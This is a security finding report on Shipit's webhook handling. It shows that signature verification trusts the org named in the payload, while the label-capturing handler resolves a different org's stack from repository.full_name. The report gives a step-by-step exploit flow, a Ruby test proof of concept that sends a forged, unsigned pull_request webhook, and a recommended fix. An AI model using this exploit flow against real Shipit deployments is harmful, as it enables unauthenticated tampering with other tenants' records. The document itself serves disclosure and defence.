### Title
Organization-confusion in webhook signature verification allows unauthenticated cross-tenant `PullRequest` label writes via `LabelCapturingHandler` - ([File: app/controllers/shipit/webhooks_controller.rb], [File: app/models/shipit/webhooks/handlers/pull_request/label_capturing_handler.rb])

### Summary
In multi-organization GitHub App configurations, `WebhooksController#verify_signature` selects which org's `webhook_secret` to check against using attacker-controlled payload fields (`repository.owner.login` / `organization.login`), while `LabelCapturingHandler` (and its siblings) independently resolves the target `Repository`/`Stack` using a different attacker-controlled payload field (`repository.full_name`), with no cross-check that the two refer to the same organization. If any configured org lacks a `webhook_secret`, an attacker can pin the verification org to that unsecured org while pointing `full_name` at any other, fully-secured victim org's stack, causing `capture_labels` to write into that victim's `PullRequest` row with no valid signature at all.

### Finding Description
Binding claimed to hold: for a request whose verifying org has `webhook_secret.present? == false`, no write should occur into another org's `PullRequest` row. This binding is broken.

`WebhooksController#verify_signature` picks the GitHub App/org used for verification purely from the JSON body: [1](#0-0) [2](#0-1) 

`Shipit.github(organization:)` looks up per-org config by that name in multi-org mode, and `GitHubApp#verify_webhook_signature` returns `true` unconditionally when that org's `webhook_secret` is blank: [3](#0-2) [4](#0-3) 

Multi-org configuration is a documented, supported feature, and per-org `webhook_secret` is explicitly optional: [5](#0-4) 

Once signature verification passes (because the *chosen* org has no secret), the dispatched handler `LabelCapturingHandler` resolves the target repository/stack from a *different* payload field, `repository.full_name`, with no requirement that it be consistent with `repository.owner.login`: [6](#0-5) [7](#0-6) 

If a real, active stack exists for that `full_name`, `capture_labels` writes the attacker-supplied label names directly onto the victim stack's `PullRequest`: [8](#0-7) [9](#0-8) 

Exploit flow: attacker sends `POST /webhooks` with `X-Github-Event: pull_request`, `action: "opened"` (or `labeled`/`reopened`), `repository.owner.login = "attacker-org"` (an org configured in Shipit without a `webhook_secret`), and `repository.full_name = "victim-org/victim-repo"` matching a real provisioned, non-archived stack, plus an arbitrary/garbage `X-Hub-Signature`. `verify_signature` resolves `Shipit.github(organization: "attacker-org")`, whose `webhook_secret` is nil, so `verify_webhook_signature` returns `true` regardless of the signature header. The request proceeds to `LabelCapturingHandler`, which looks up the victim's stack by `full_name` and overwrites `pull_request.labels` on that stack's `PullRequest` row.

Existing guards do not prevent this: `drop_unhandled_event` only checks the event has a handler; the `ExplicitParameters` schema for this handler requires only `repository.full_name` and does not require or validate `repository.owner.login` against it; `capture_labels?`/`opened_active_stack?`/`labeled_active_stack?` only check `stack.present?` (and, for non-`opened` actions, `!archived?`) — they check nothing about which org's webhook_secret verified the request. There is no code anywhere binding the org used in `verify_signature` to the org embedded in `full_name`.

### Impact Explanation
An attacker who can identify (or is themselves the owner of) any configured GitHub organization on the Shipit instance that lacks a `webhook_secret` can, with zero valid cryptographic signature, write arbitrary label data into the `PullRequest` record of any other organization's stack, as long as that stack is active/known. This is a cross-tenant DB write triggered by a request that never validly authenticates against the victim organization at all — matching the Critical category "a payload for one repository mutating another's stack/... record." The blast radius spans every stack across every org configured on the same Shipit instance, and the attack is trivially repeatable (a single unauthenticated HTTP POST per target PR).

### Likelihood Explanation
This requires: (1) the Shipit instance to be configured with **multiple** GitHub orgs (the documented multi-org schema), and (2) at least one of those configured orgs to have no `webhook_secret` set — which the docs explicitly mark as optional and which example/dummy configs in this repo default to `nil`. Given that precondition, the attack costs a single crafted HTTP request with no secrets, no session, and no GitHub signature — fully within the stated unprivileged attacker capability. The precondition is a real, plausible operational configuration (not merely theoretical), since the docs never require a webhook secret and provide examples where it is left blank.

### Recommendation
Bind webhook signature verification to the actual target of the payload rather than an attacker-controlled org field: derive/verify against the org embedded in `repository.full_name` (or cross-validate `repository.owner.login` against `repository.full_name`'s owner segment) before dispatching, and reject the request if they diverge. Additionally, consider making `webhook_secret` mandatory (fail closed) for any organization added to the multi-org config, rather than silently trusting unsigned payloads when it's blank.

### Proof of Concept
```ruby
# test/controllers/webhooks_controller_org_confusion_test.rb
require 'test_helper'

module Shipit
  class WebhooksControllerOrgConfusionTest < ActionController::TestCase
    tests Shipit::WebhooksController

    setup do
      secrets = ActiveSupport::OrderedOptions.new
      secrets.merge!(YAML.load_file('test/dummy/config/secrets_double_github_app.yml'))
      secrets.deep_symbolize_keys!
      Shipit.stubs(:secrets).returns(secrets) # OrgOne/OrgTwo both webhook_secret: nil

      @victim_repo = shipit_repositories(:shipit) # e.g. "shopify/shipit-engine"
      @victim_repo.update!(provisioning_behavior: :allow_all)
    end

    test "unsigned webhook claiming an unsecured org still writes labels onto a victim org's PullRequest" do
      opened_payload = JSON.parse(payload(:pull_request_opened))
      Shipit::Webhooks::Handlers::PullRequest::OpenedHandler.new(opened_payload).process
      victim_stack = @victim_repo.stacks.last
      # complete provisioning task so stack is active/non-archived
      victim_stack.tasks.active.each { |t| t.run; t.complete }

      labeled_payload = JSON.parse(payload(:pull_request_labeled))
      # Binding under test: verifying org == "OrgOne" (webhook_secret nil) != victim org owning the stack
      labeled_payload["repository"]["owner"]["login"] = "OrgOne"
      labeled_payload["repository"]["full_name"] = @victim_repo.full_name # victim org/repo, unrelated to OrgOne
      labeled_payload["pull_request"]["labels"] = [{ "name" => "attacker-injected-label" }]

      @request.headers['X-Github-Event'] = 'pull_request'
      @request.headers['X-Hub-Signature'] = 'sha1=deadbeefnotarealsignature'

      assert_equal false, Shipit.github(organization: "OrgOne").webhook_secret.present?

      post :create, body: labeled_payload.to_json, as: :json
      assert_response :ok

      assert_includes victim_stack.reload.pull_request.labels, "attacker-injected-label"
    end
  end
end
```
This asserts both sides of the binding explicitly: `webhook_secret.present?` for the verifying org (`OrgOne`) is `false`, yet the write lands on `@victim_repo`/`victim_stack`, a different org's `PullRequest`, with a garbage signature — demonstrating the divergence.

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L24-31)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified

```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit.rb (L170-200)
```ruby
  def github(organization: github_default_organization)
    # Backward compatibility
    # nil signifies the single github app config schema is being used
    if github_default_organization.nil?
      config = secrets.github
    else
      config = github_app_config(organization)
      raise GithubOrganizationUnknown, organization if config.nil?
    end
    @github ||= {}
    @github[organization] ||= GitHubApp.new(organization, config)
  end

  def github_default_organization
    return nil unless secrets&.github

    org = secrets.github.keys.first
    TOP_LEVEL_GH_KEYS.include?(org) ? nil : org
  end

  def github_organizations
    return [nil] unless github_default_organization

    secrets.github.keys
  end

  def github_app_config(organization)
    github_config = secrets.github.deep_transform_keys(&:downcase)
    github_organization = organization.downcase.to_sym
    github_config[github_organization]
  end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** docs/setup.md (L182-209)
```markdown
### Using Multiple Github Applications

A Github application can only authenticate to the Github organization it's installed in. If you want to deploy code from multiple Github organizations the `github` section of your `config/secrets.yml` will need to be formatted differently. The top-level keys should be the name of each Github organization, and the following sub-keys are the Github app details for that particular organization.

For example:

```yml
production:
  github:
    somegithuborg:
      app_id:
      installation_id:
      webhook_secret:
      private_key:
      oauth:
        id:
        secret:
        teams:
    someothergithuborg:
      app_id:
      installation_id:
      webhook_secret:
      private_key:
      oauth:
        id:
        secret:
        teams:
```
```

**File:** app/models/shipit/webhooks/handlers/pull_request/label_capturing_handler.rb (L33-39)
```ruby
            requires :repository do
              requires :full_name, String
            end
            requires :sender do
              requires :login, String
            end
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/label_capturing_handler.rb (L41-47)
```ruby
          def process
            return unless capture_labels?

            capture_labels

            stack
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/label_capturing_handler.rb (L98-102)
```ruby
          def capture_labels
            return unless pull_request = stack.pull_request

            pull_request.update!(labels: params.pull_request.labels.map(&:name))
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/label_capturing_handler.rb (L110-118)
```ruby
          def repository
            @repository ||=
              Shipit::Repository
              .from_github_repo_name(params.repository.full_name) || NullRepository.new
          end

          def stack
            @stack ||= review_stack.stack
          end
```
